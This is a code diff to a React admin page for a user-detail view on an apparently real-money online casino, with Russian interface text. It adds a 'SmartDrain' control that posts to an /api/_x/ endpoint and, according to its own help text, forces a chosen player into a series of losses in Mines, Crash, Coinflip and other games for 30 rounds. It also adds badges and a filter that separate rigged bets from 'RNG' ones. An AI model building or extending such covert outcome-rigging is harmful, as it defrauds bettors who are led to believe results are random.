@@ -11,6 +11,9 @@ import {
   Wallet,
   ChevronRight,
   X,
+  Zap,
+  Trophy,
+  Coins,
 } from 'lucide-react';
 import { HelpButton } from '@/components/admin/help-button';
 import { resolveGameKey, gameLabel } from '@/components/ui/game-icon';
@@ -56,6 +59,12 @@ interface UserDetail {
     wagerTarget: number;
     wagerProgress: number;
   };
+  drain?: {
+    active: boolean;
+    roundsLeft: number;
+    expiresAt: number;
+    reason: string | null;
+  };
   stats: {
     totalBets: number;
     wagered: number;
@@ -82,6 +91,12 @@ interface UserDetail {
     state: string;
     placedAt: number;
     resolvedAt: number | null;
+    isTournament?: boolean;
+    balanceType?: 'real' | 'tournament';
+    tournamentId?: string | null;
+    isScriptIntervened?: boolean;
+    scriptReason?: string | null;
+    metadata?: unknown;
     source?: string | null;
   }>;
   transactions: Array<{
@@ -162,6 +177,8 @@ export default function UserDetailPage() {
   const [wagerForm, setWagerForm] = useState({ target: '0', progress: '0' });
   const [wagerBusy, setWagerBusy] = useState(false);
   const [wagerHistory, setWagerHistory] = useState<any[]>([]);
+  const [betFilter, setBetFilter] = useState<'all' | 'real' | 'tournament' | 'script'>('all');
+  const [drainBusy, setDrainBusy] = useState(false);
 
   // Action modal state — single modal driven by `action`.
   type Action = null | 'balance' | 'block' | 'lock' | 'whitelist';
@@ -170,6 +187,41 @@ export default function UserDetailPage() {
   const [txType, setTxType] = useState<string>('admin_adjustment');
   const [reason, setReason] = useState<string>('');
   const [busy, setBusy] = useState(false);
+
+  const toggleDrain = async (enable: boolean, rounds = 30) => {
+    const reason = prompt(
+      enable
+        ? `Причина установки слива (SmartDrain на ${rounds} раунд(ов)):`
+        : 'Причина снятия со слива:'
+    );
+    if (!reason || reason.trim().length < 3) return;
+    setDrainBusy(true);
+    try {
+      if (enable) {
+        await fetch(`/api/_x/users/${userId}/drain`, {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ rounds, reason: reason.trim() }),
+        });
+      } else {
+        await fetch(`/api/_x/users/${userId}/drain`, {
+          method: 'DELETE',
+          credentials: 'include',
+        });
+      }
+      await reload();
+    } finally {
+      setDrainBusy(false);
+    }
+  };
+
+  const filteredBets = (data?.bets ?? []).filter((b) => {
+    if (betFilter === 'real') return !b.isTournament;
+    if (betFilter === 'tournament') return !!b.isTournament;
+    if (betFilter === 'script') return !!b.isScriptIntervened;
+    return true;
+  });
 
   const reload = useCallback(async () => {
     try {
@@ -665,9 +717,17 @@ export default function UserDetailPage() {
         {/* Actions */}
         <section className="rounded-card border border-white/10 bg-white/[0.04] backdrop-blur-xl shadow-sm overflow-hidden">
           <div className="flex items-center justify-between px-4 py-2.5 border-b border-white/10">
-            <span className="font-roobert text-[10.5px] uppercase tracking-[0.05em] text-whisper-gray">
-              Действия
-            </span>
+            <div className="flex items-center gap-2">
+              <span className="font-roobert text-[10.5px] uppercase tracking-[0.05em] text-whisper-gray">
+                Действия
+              </span>
+              {data.drain?.active && (
+                <span className="px-2 py-0.5 rounded-pill bg-red-500/20 border border-red-500/40 text-red-300 font-mono text-[10px] font-bold animate-pulse inline-flex items-center gap-1">
+                  <Zap size={10} className="text-red-400" />
+                  SmartDrain АКТИВЕН ({data.drain.roundsLeft} раунд.)
+                </span>
+              )}
+            </div>
             <HelpButton title="Действия с игроком" size={12}>
               <p>
                 Каждое действие требует <strong>причину</strong> минимум
@@ -675,13 +735,11 @@ export default function UserDetailPage() {
                 админам в разделе «Аудит».
               </p>
               <p>
-                Изменения баланса проходят через атомарную транзакцию,
-                поэтому конкурентные ставки игрока не могут «обойти»
-                ваше изменение.
+                <strong>SmartDrain:</strong> принудительно направляет игрока в серию проигрышей (в играх Mines, Crash, Coinflip и т.д.).
               </p>
             </HelpButton>
           </div>
-          <div className="grid grid-cols-1 sm:grid-cols-3 divide-y sm:divide-y-0 sm:divide-x divide-white/5">
+          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 divide-y sm:divide-y-0 sm:divide-x divide-white/5">
             <ActionButton
               label="Изменить баланс"
               hint="Кредит / дебет с причиной"
@@ -690,6 +748,12 @@ export default function UserDetailPage() {
                 setDelta('');
                 setReason('');
               }}
+            />
+            <ActionButton
+              label={data.drain?.active ? '⚡ Снять со слива' : '⚡ Поставить на слив'}
+              hint={data.drain?.active ? `SmartDrain: ${data.drain.roundsLeft} раундов` : 'Слив SmartDrain (30 раундов)'}
+              danger={Boolean(data.drain?.active)}
+              onClick={() => toggleDrain(!data.drain?.active, 30)}
             />
             <ActionButton
               label={u.isBlocked ? 'Снять блокировку' : 'Заблокировать'}
@@ -727,73 +791,151 @@ export default function UserDetailPage() {
 
         {/* Recent bets */}
         <section>
-          <div className="flex items-baseline justify-between px-1 mb-2">
-            <span className="font-roobert text-[10px] uppercase tracking-[0.32em] text-whisper-gray">
-              Последние ставки
-            </span>
+          <div className="flex flex-col sm:flex-row sm:items-center justify-between px-1 mb-2.5 gap-2">
+            <div className="flex flex-wrap items-center gap-2">
+              <span className="font-roobert text-[10px] uppercase tracking-[0.32em] text-whisper-gray">
+                Последние ставки
+              </span>
+              {/* Filter tabs */}
+              <div className="flex flex-wrap items-center gap-1 bg-white/[0.04] border border-white/10 p-0.5 rounded-pill text-[11px] font-roobert">
+                <button
+                  onClick={() => setBetFilter('all')}
+                  className={`px-2.5 py-0.5 rounded-pill transition-all ${
+                    betFilter === 'all'
+                      ? 'bg-white/15 text-frost-white font-medium shadow-sm'
+                      : 'text-whisper-gray hover:text-frost-white'
+                  }`}
+                >
+                  Все ({data.bets.length})
+                </button>
+                <button
+                  onClick={() => setBetFilter('real')}
+                  className={`px-2.5 py-0.5 rounded-pill transition-all ${
+                    betFilter === 'real'
+                      ? 'bg-emerald-500/20 border border-emerald-500/30 text-emerald-300 font-medium'
+                      : 'text-whisper-gray hover:text-frost-white'
+                  }`}
+                >
+                  💰 Реальный ({data.bets.filter((b) => !b.isTournament).length})
+                </button>
+                <button
+                  onClick={() => setBetFilter('tournament')}
+                  className={`px-2.5 py-0.5 rounded-pill transition-all ${
+                    betFilter === 'tournament'
+                      ? 'bg-amber-500/20 border border-amber-500/30 text-amber-300 font-medium'
+                      : 'text-whisper-gray hover:text-frost-white'
+                  }`}
+                >
+                  🏆 Турнирный ({data.bets.filter((b) => b.isTournament).length})
+                </button>
+                <button
+                  onClick={() => setBetFilter('script')}
+                  className={`px-2.5 py-0.5 rounded-pill transition-all ${
+                    betFilter === 'script'
+                      ? 'bg-red-500/20 border border-red-500/30 text-red-300 font-medium'
+                      : 'text-whisper-gray hover:text-frost-white'
+                  }`}
+                >
+                  ⚡ Скрипт ({data.bets.filter((b) => b.isScriptIntervened).length})
+                </button>
+              </div>
+            </div>
             <div className="flex items-center gap-2 text-[11px] text-whisper-gray font-roobert">
               <span>
-                {data.bets.length} / {data.totals?.bets ?? data.bets.length}
+                {filteredBets.length} из {data.totals?.bets ?? data.bets.length}
               </span>
               {data.bets.length < (data.totals?.bets ?? Infinity) && data.bets.length < 500 && (
                 <button
                   onClick={() => setBetLimit((v) => Math.min(500, v + 100))}
-                  className="px-2 py-0.5 rounded-pill border border-white/15 bg-white/[0.05] hover:border-white/25"
+                  className="px-2 py-0.5 rounded-pill border border-white/15 bg-white/[0.05] hover:border-white/25 text-frost-white"
                 >
                   Показать ещё
                 </button>
               )}
             </div>
           </div>
-          {data.bets.length === 0 ? (
+
+          {filteredBets.length === 0 ? (
             <div className="rounded-card border border-white/10 bg-white/[0.03] px-5 py-6 text-center font-roobert text-[12px] text-whisper-gray">
-              Игрок ещё не делал ставок.
+              {betFilter === 'all' ? 'Игрок ещё не делал ставок.' : 'Нет ставок по данному фильтру.'}
             </div>
           ) : (
             <div className="rounded-card border border-white/10 bg-white/[0.03] overflow-hidden divide-y divide-white/5">
-              {data.bets.map((b) => {
+              {filteredBets.map((b) => {
                 const won = (b.payout ?? 0) > 0;
                 const net = (b.payout ?? 0) - b.amount;
                 return (
                   <div
                     key={b.id}
-                    className={`grid grid-cols-[1fr_auto_auto] items-center gap-3 px-4 py-3 ${
-                      b.metadata?.tournamentId ? 'border-l-2 border-l-[#ffac2e] bg-[#ffac2e]/[0.02]' : ''
+                    className={`grid grid-cols-[1fr_auto_auto] items-center gap-3 px-4 py-3 transition-colors hover:bg-white/[0.02] ${
+                      b.isTournament
+                        ? 'border-l-2 border-l-amber-400 bg-amber-400/[0.02]'
+                        : b.isScriptIntervened
+                        ? 'border-l-2 border-l-red-500 bg-red-500/[0.03]'
+                        : ''
                     }`}
                   >
                     <div className="min-w-0">
-                      <div className="font-roobert text-[13px] text-frost-white truncate">
-                        {gameLabel(resolveGameKey(b.gameType))}
+                      <div className="flex flex-wrap items-center gap-1.5 font-roobert text-[13px] text-frost-white truncate">
+                        <span className="font-semibold">{gameLabel(resolveGameKey(b.gameType))}</span>
+
+                        {/* Balance source badge */}
+                        {b.isTournament ? (
+                          <span className="px-2 py-0.5 rounded-pill bg-amber-500/15 border border-amber-500/30 text-amber-300 font-mono text-[10px] font-bold inline-flex items-center gap-1">
+                            🏆 Турнирный
+                          </span>
+                        ) : (
+                          <span className="px-2 py-0.5 rounded-pill bg-emerald-500/10 border border-emerald-500/25 text-emerald-300 font-mono text-[10px] font-medium inline-flex items-center gap-1">
+                            💰 Реальный
+                          </span>
+                        )}
+
+                        {/* Script intervention badge */}
+                        {b.isScriptIntervened ? (
+                          <span
+                            className="px-2 py-0.5 rounded-pill bg-red-500/20 border border-red-500/40 text-red-300 font-mono text-[10px] font-bold inline-flex items-center gap-1"
+                            title={b.scriptReason || 'Вмешательство скрипта / RTP'}
+                          >
+                            ⚡ {b.scriptReason || 'Слив (SmartDrain)'}
+                          </span>
+                        ) : (
+                          <span className="px-1.5 py-0.5 rounded-pill bg-white/[0.03] border border-white/10 text-white/40 text-[9px] font-mono">
+                            🎲 RNG
+                          </span>
+                        )}
                       </div>
-                      <div className="flex items-center gap-2 font-roobert text-[10px] text-whisper-gray tabular-nums truncate">
+
+                      <div className="flex items-center gap-2 font-roobert text-[10px] text-whisper-gray tabular-nums truncate mt-0.5">
                         <span>{new Date(b.placedAt).toLocaleString('ru-RU')} · {b.state}</span>
                         {b.source && (
-                          <span className="px-2 py-0.5 rounded-pill border border-white/15 bg-white/[0.04] uppercase tracking-[0.12em]">
+                          <span className="px-1.5 py-0.2 rounded-pill border border-white/15 bg-white/[0.04] uppercase tracking-[0.1em] text-[9px]">
                             {b.source}
                           </span>
                         )}
                       </div>
                     </div>
+
                     <div className="text-right">
-                      <div className="font-roobert text-[12px] text-whisper-gray tabular-nums">
+                      <div className="font-roobert text-[11px] text-whisper-gray tabular-nums">
                         Ставка
                       </div>
-                      <div className="font-roobert text-[12px] tabular-nums">
-                        {b.amount.toLocaleString('ru-RU')}
+                      <div className="font-roobert text-[13px] font-medium tabular-nums text-frost-white">
+                        {b.amount.toLocaleString('ru-RU')} {data.user.currency}
                       </div>
                     </div>
-                    <div className="text-right w-20">
-                      <div className="font-roobert text-[12px] text-whisper-gray tabular-nums">
+
+                    <div className="text-right w-24">
+                      <div className="font-roobert text-[11px] text-whisper-gray tabular-nums">
                         {b.multiplier !== null ? `x${b.multiplier.toFixed(2)}` : '—'}
                       </div>
                       <div
-                        className={`font-roobert text-[12px] tabular-nums ${
-                          won ? 'text-frost-white' : 'text-[#ff8a76]/85'
+                        className={`font-roobert text-[13px] font-semibold tabular-nums ${
+                          won ? 'text-emerald-400' : 'text-red-400'
                         }`}
                       >
                         {net >= 0 ? '+' : '−'}
                         {Math.abs(net).toLocaleString('ru-RU', {
-                          maximumFractionDigits: 0,
+                          maximumFractionDigits: 2,
                         })}
                       </div>
                     </div>
